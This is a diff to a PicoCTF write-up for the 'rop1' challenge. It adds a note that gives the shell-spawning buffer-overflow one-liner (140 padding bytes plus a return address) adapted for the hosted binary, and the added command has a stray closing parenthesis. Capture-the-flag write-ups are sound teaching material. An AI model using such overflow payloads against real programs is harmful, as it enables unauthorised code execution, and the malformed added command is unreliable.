@@ -64,6 +64,12 @@ away. Finally:
 (python -c 'print "A"\*140 + "\xa4\x84\x04\x08"';cat )| ./rop1-fa6168f4d8eba0eb
 ```
 will get you a shell!
+
+**Note:** This was solved locally on my machine. When using the PicoCTF shell,
+the name of the binary is simply "rop1". The final command would change to:
+```
+python -c 'print "A"\*140 + "\xa4\x84\x04\x08"';cat )| ./rop1
+```
 ## Other write-ups and resources
 
 * none yet
